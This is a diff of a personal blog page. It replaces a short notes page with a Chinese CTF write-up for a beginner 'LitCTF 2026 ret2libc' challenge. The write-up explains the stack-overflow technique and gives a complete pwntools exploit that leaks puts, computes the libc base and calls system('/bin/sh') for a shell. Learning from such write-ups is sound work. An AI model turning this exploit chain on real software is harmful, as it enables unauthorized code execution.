@@ -3,7 +3,7 @@
 <html lang="zh-CN">
 <head>
     <meta charset="utf-8" />
-    <title>碎碎念 | 0xt5 Blog</title>
+    <title>LitCTF 2026 - ret2libc | 0xt5 Blog</title>
     <meta name="author" content="0xt5" />
     <meta name="description" content="一个基于 Hexo 和 GitHub Pages 的个人博客" />
     <meta name="keywords" content="Hexo,GitHub Pages,Blog" />
@@ -164,109 +164,122 @@
 </transition>
 
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
-            
-<div class="article">
-    <div class="content">
-        <style>
-        .murmur-wrap {
-          margin: 0 auto;
-          max-width: 860px;
-        }
-
-        .murmur-head {
-          margin-bottom: 22px;
-          padding: 24px 26px;
-          border-radius: 20px;
-          background: linear-gradient(135deg, rgba(102,175,239,.12), rgba(255,162,196,.12));
-          border: 1px solid rgba(102,175,239,.15);
-        }
-
-        .murmur-head h2 {
-          margin: 0 0 10px;
-        }
-
-        .murmur-head p {
-          margin: 0;
-          line-height: 1.8;
-          color: #5c6b72;
-        }
-
-        .murmur-year {
-          margin-top: 28px;
-        }
-
-        .murmur-year-title {
-          margin: 0 0 14px;
-          font-size: 28px;
-          line-height: 1.2;
-        }
-
-        .murmur-month {
-          margin-bottom: 24px;
-        }
-
-        .murmur-month-title {
-          margin: 0 0 14px;
-          font-size: 18px;
-          color: #4f6070;
-        }
-
-        .murmur-list {
-          display: grid;
-          gap: 14px;
-        }
-
-        .murmur-card {
-          padding: 16px 18px;
-          border-radius: 16px;
-          background: #fff;
-          border: 1px solid #e8edf5;
-          box-shadow: 0 8px 22px rgba(120, 140, 160, 0.10);
-        }
-
-        .murmur-time {
-          margin-bottom: 8px;
-          font-size: 12px;
-          color: #8a97a3;
-        }
-
-        .murmur-text {
-          line-height: 1.9;
-          color: #334;
-          white-space: pre-wrap;
-          word-break: break-word;
-        }
-
-        </style>
-
-        <div class="murmur-wrap">
-            <div class="murmur-head">
-              <h2>碎碎念</h2>
-              <p>这里放一些不成体系的想法、情绪、碎碎念，或者突然想记下来的几句话。</p>
-            </div>
-
-            
-
-            
-            <section class="murmur-year" id="murmur-year-2026">
-              <h2 class="murmur-year-title">2026</h2>
-              
-              <section class="murmur-month" id="murmur-2026-5">
-                <h3 class="murmur-month-title">5月</h3>
-                <div class="murmur-list">
-                  
-                  <div class="murmur-card">
-                    <div class="murmur-time">5-21</div>
-                    <div class="murmur-text">也是把博客搭建好了，ai真好用，我要狠狠的学pwn！</div>
-                  </div>
-                  
-                </div>
-              </section>
-              
-            </section>
-            
-        </div>
+            <div class="article">
+    <div>
+        <h1>LitCTF 2026 - ret2libc</h1>
     </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2026/5/23
+        </span>
+        
+        <span class="category">
+            <a href="/categories/CTF/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                CTF
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                <a href="/tags/%E5%9F%BA%E7%A1%80%E9%A2%98/" data-tag-name="基础题" data-tag-color-role="text">
+                    基础题
+                </a>
+            </span>
+            
+            <span class="tag">
+                <a href="/tags/ret2libc/" data-tag-name="ret2libc" data-tag-color-role="text">
+                    ret2libc
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="LitCTF-2026-ret2libc"><a href="#LitCTF-2026-ret2libc" class="headerlink" title="LitCTF 2026 - ret2libc"></a>LitCTF 2026 - ret2libc</h1><p><a target="_blank" rel="noopener" href="https://platform.cyclens.tech/api/upload/55d197e2-f1dd-47be-8439-6086bd58868d">题目地址</a></p>
+<p>这道题还是挺简单的挺适合初学者做的</p>
+<p>前置知识补充：ret2libc攻击的核心思想是利用程序中的栈溢出漏洞，覆盖函数的返回地址，使其指向libc库中的system函数，并传递”&#x2F;bin&#x2F;sh”字符串作为参数，从而获得一个shell。</p>
+<p>想要进阶的理解的话可以看这个<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/14087">深入理解 ret2libc 技术-先知社区</a></p>
+<p>最基础的ret2libc 甚至还给了pop_rdi leak_value</p>
+<p>checksec一下</p>
+<p><img src="/images/litctf-ret2libc/image-20260523173601041.png" alt="checksec"></p>
+<p>ida一下</p>
+<p><img src="/images/litctf-ret2libc/image-20260523175847781.png" alt="ida"></p>
+<p>发现这里有现成的可以利用的rdi ret</p>
+<p><img src="/images/litctf-ret2libc/image-20260523175911228.png" alt="pop-rdi"></p>
+<p>还有泄露地址的地方</p>
+<p><img src="/images/litctf-ret2libc/image-20260523180028904.png" alt="leak"></p>
+<p>然后第一部分溢出之后然后泄露地址</p>
+<p>然后返回main函数，接受地址之后</p>
+<p>计算libc基址，然后溢出之后再binsh</p>
+<pre><code class="language-python">from pwn import *
+
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;)
+
+elf = ELF(&quot;./ret2libc&quot;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+
+io = process(&quot;./ret2libc&quot;)
+#io = remote(&quot;challenge.cyclens.tech&quot;, 30528)
+
+pop_rdi = 0x4011b7
+ret = 0x4011b8
+leak_value = 0x4011c3
+main_addr = 0x401234
+
+offset = 72
+
+payload = b&quot;a&quot; * offset
+payload += p64(ret)
+payload += p64(pop_rdi)
+payload += p64(elf.got[&quot;puts&quot;])
+payload += p64(leak_value)
+payload += p64(ret)
+payload += p64(main_addr)
+
+io.recvuntil(b&quot;Tell me your name: &quot;)
+io.send(payload)
+
+io.recvuntil(b&quot;Leak: &quot;)
+puts_addr = int(io.recvline().strip(), 16)
+print(&quot;puts_addr =&quot;, hex(puts_addr))
+
+libc_base = puts_addr - libc.sym[&quot;puts&quot;]
+system_addr = libc_base + libc.sym[&quot;system&quot;]
+binsh_addr = libc_base + next(libc.search(b&quot;/bin/sh\x00&quot;))
+
+print(&quot;libc_base =&quot;, hex(libc_base))
+print(&quot;system_addr =&quot;, hex(system_addr))
+print(&quot;binsh_addr =&quot;, hex(binsh_addr))
+
+payload = b&quot;a&quot; * offset
+payload += p64(pop_rdi)
+payload += p64(binsh_addr)
+payload += p64(ret)
+payload += p64(system_addr)
+
+io.recvuntil(b&quot;Tell me your name: &quot;)
+io.send(payload)
+
+io.interactive()
+</code></pre>
+<p><img src="/images/litctf-ret2libc/image-20260523181855765.png" alt="getshell"></p>
+
+    </div>
+    
+    
 </div>
 
             <footer id="footer">
